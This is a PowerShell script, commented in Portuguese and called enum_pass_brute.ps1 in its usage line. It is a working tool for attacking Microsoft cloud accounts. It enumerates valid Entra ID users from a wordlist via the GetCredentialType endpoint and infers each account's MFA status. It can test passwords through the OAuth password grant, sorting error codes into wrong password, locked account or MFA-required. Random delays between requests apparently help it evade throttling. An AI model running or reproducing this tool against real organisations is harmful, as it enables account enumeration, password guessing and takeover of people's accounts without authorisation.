param(
    [string]$Domain   = "empresa.com",
    [string]$UserList = ".\users.txt",
    [switch]$TestLogin
)

Write-Host "para usar rode o comando .\enum_pass_brute.ps1 -Domain empresa.com -UserList .\users.txt -TestLogin"

# =========================
# CONFIG
# =========================
$ClientId = "04b07795-8ddb-461a-bbee-02f9e1bf7b46" # Azure CLI

# Verificar e instalar módulo MSAL.PS se necessário
if (!(Get-Module -ListAvailable -Name MSAL.PS)) {
    Write-Host "[+] Instalando módulo MSAL.PS..." -ForegroundColor Cyan
    Install-Module -Name MSAL.PS -Force -Scope CurrentUser -AllowClobber
}

# Importar módulo MSAL.PS
Import-Module MSAL.PS -ErrorAction Stop

if (!(Test-Path $UserList)) {
    Write-Host "[ERRO] Wordlist não encontrada: $UserList" -ForegroundColor Red
    exit
}

$timestamp  = Get-Date -Format "yyyyMMdd_HHmmss"
$outputFile = "enum_ms_$timestamp.txt"

$url = "https://login.microsoftonline.com/common/GetCredentialType"

$valid   = 0
$invalid = 0
$unknown = 0

Write-Host "`n[+] Iniciando enumeração..." -ForegroundColor Cyan

$loginStatusColors = @{
    "SENHA_INCORRETA"            = "Yellow"
    "LOGIN_OK MAS MFA REQUERIDO" = "DarkYellow"
    "LOGIN_OK"                   = "Green"
    "CONTA_BLOQUEADA"            = "Red"
    "CONTA_EM_OUTRO_TENANT"      = "Yellow"
    "USUARIO_NAO_ENCONTRADO"     = "DarkGray"
    "ERRO"                       = "DarkGray"
}

# =========================
# LOOP PRINCIPAL
# =========================
 
foreach ($user in Get-Content $UserList) {

    if ([string]::IsNullOrWhiteSpace($user)) { continue }

    $email = "$user@$Domain"

    $body = @{ Username = $email } | ConvertTo-Json

    try {
        $response = Invoke-RestMethod -Method POST `
                                     -Uri $url `
                                     -Body $body `
                                     -ContentType "application/json"

        $status      = "DESCONHECIDO"
        $mfaStatus   = "NAO_DETECTADO"
        $loginStatus = "NAO_TESTADO"

        # =========================
        # EXISTÊNCIA
        # =========================
        if ($response.IfExistsResult -eq 0) {
            $status = "VALIDO"
            $valid++
        }
        elseif ($response.IfExistsResult -eq 1) {
            $status = "INVALIDO"
            $invalid++
        }
        else {
            $unknown++
        }

        # =========================
        # MFA (INDÍCIO)
        # =========================
        if ($response.PSObject.Properties.Name -contains "IsMfaRegistered") {
            if ($response.IsMfaRegistered -eq $true) {
                $mfaStatus = "MFA_REGISTRADO"
            }
        }
        elseif ($response.PSObject.Properties.Name -contains "EstsProperties") {
            if ($response.EstsProperties.MfaRequired -eq $true) {
                $mfaStatus = "MFA_REQUERIDO"
            }
        }

        # Verificar outros indicadores de MFA na resposta
        if ($response.PSObject.Properties.Name -contains "Credentials") {
            foreach ($cred in $response.Credentials) {
                if ($cred.Type -eq "PhoneApp" -or $cred.Type -eq "OneWaySms" -or $cred.Type -eq "TwoWaySms") {
                    $mfaStatus = "MFA_DETECTADO"
                    break
                }
            }
        }

        # Verificar se há indicação de MFA em ThrottleStatus
        if ($response.PSObject.Properties.Name -contains "ThrottleStatus") {
            if ($response.ThrottleStatus -eq 1) {
                $mfaStatus = "MFA_POSSIVEL"
            }
        }

        # =========================
        # TESTE DE LOGIN CONTROLADO
        # =========================
        if ($TestLogin -and $status -eq "VALIDO") {
            Write-Host "`n----------------------------------------"
            Write-Host "`n[?] Testar login para $email ?" -ForegroundColor Yellow
            $choice = Read-Host "[y/N]"

            if ($choice -eq "y") {

                $securePass = Read-Host "Senha" -AsSecureString
                $plainPass  = [Runtime.InteropServices.Marshal]::PtrToStringAuto(
                    [Runtime.InteropServices.Marshal]::SecureStringToBSTR($securePass)
                )

                try {
                    # Extrair o TenantId do domínio
                    $tenantResponse = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$Domain/.well-known/openid-configuration" -ErrorAction Stop
                    $tenantId = $tenantResponse.token_endpoint.Split('/')[3]

                    Write-Host "[*] TenantId: $tenantId" -ForegroundColor DarkGray

                    # Usar a API REST diretamente para autenticação
                    $tokenUrl = "https://login.microsoftonline.com/$tenantId/oauth2/v2.0/token"
                    $body = @{
                        client_id = $ClientId
                        scope = "https://graph.microsoft.com/.default"
                        username = $email
                        password = $plainPass
                        grant_type = "password"
                    }

                    try {
                        $tokenResponse = Invoke-RestMethod -Method POST -Uri $tokenUrl -Body $body -ErrorAction Stop

                        if ($tokenResponse.access_token) {
                            $loginStatus = "LOGIN_OK"
                            Write-Host "[+] LOGIN OK" -ForegroundColor Green
                        }
                    }
                    catch {
                        # Capturar a resposta completa do erro
                        $errorResponse = $_.ErrorDetails.Message
                        if ([string]::IsNullOrEmpty($errorResponse)) {
                            $errorResponse = $_.Exception.Message
                        }

                        #Write-Host "[!] Resposta do servidor: $errorResponse" -ForegroundColor DarkRed

                        # Tentar analisar o JSON da resposta de erro
                        
                        try {
                            $errorJson = $errorResponse | ConvertFrom-Json
                            $errorCode = $errorJson.error
                            $errorDesc = $errorJson.error_description

                            switch -Regex ($errorDesc) {
                                "AADSTS50126" {
                                    $loginStatus = "SENHA_INCORRETA" 
                                }
                                "AADSTS50076|AADSTS50079" {
                                    $loginStatus = "LOGIN_OK MAS MFA REQUERIDO"
                                    if ($mfaStatus -eq "NAO_DETECTADO") {
                                        $mfaStatus = "MFA_REQUERIDO"
                                    }
                                }
                                "AADSTS50053" {
                                    $loginStatus = "CONTA_BLOQUEADA"
                                }
                                "AADSTS50155" {
                                    $loginStatus = "CONTA_EM_OUTRO_TENANT"
                                }
                                "AADSTS50034" {
                                    $loginStatus = "USUARIO_NAO_ENCONTRADO"
                                }
                                default {
                                    $loginStatus = "ERRO"
                                }
                            }
                        }
                        catch {
                            $loginStatus = "ERRO"
                        }


                        Write-Host "[!] $loginStatus" -ForegroundColor Red
                        throw  # Re-lançar o erro para sair do bloco try externo
                    }
                }
                catch {
                    # Erro já tratado no bloco interno
                }
            }
        }

        # =========================
        # OUTPUT
        # =========================
        
        # email
        Write-Host "$email -> " -ForegroundColor DarkGray -NoNewline

        # status (VALIDO / INVALIDO)
        $statusColor = if ($status -eq "VALIDO") { "Yellow" } else { "DarkGray" }
        Write-Host "$status | " -ForegroundColor $statusColor -NoNewline

        # MFA
        $mfaColor = switch ($mfaStatus) {
            "MFA_REQUERIDO"  { "Blue" }
            "MFA_DETECTADO" { "Yellow" }
            default         { "DarkGray" }
        }
        Write-Host "MFA: $mfaStatus | " -ForegroundColor $mfaColor -NoNewline

        # LOGIN (cor pelo mapa)
        $loginColor = $loginStatusColors[$loginStatus]
        if (-not $loginColor) { $loginColor = "DarkGray" }

        Write-Host "LOGIN: $loginStatus" -ForegroundColor $loginColor

        # arquivo continua em texto simples
        $line = "$email -> $status | MFA: $mfaStatus | LOGIN: $loginStatus"
        Add-Content -Path $outputFile -Value $line

    }
    catch {
        $line = "$email -> ERRO"
        Write-Host $line -ForegroundColor Red
        Add-Content -Path $outputFile -Value $line
    }

    Start-Sleep -Milliseconds (Get-Random -Minimum 300 -Maximum 900)
}

# =========================
# RESUMO
# =========================

$summary = @"
=========================
RESUMO
=========================
VALIDOS:       $valid
INVALIDOS:     $invalid
DESCONHECIDOS: $unknown
=========================
"@

Write-Host "`n$summary" -ForegroundColor Cyan
Add-Content -Path $outputFile -Value "`n$summary"
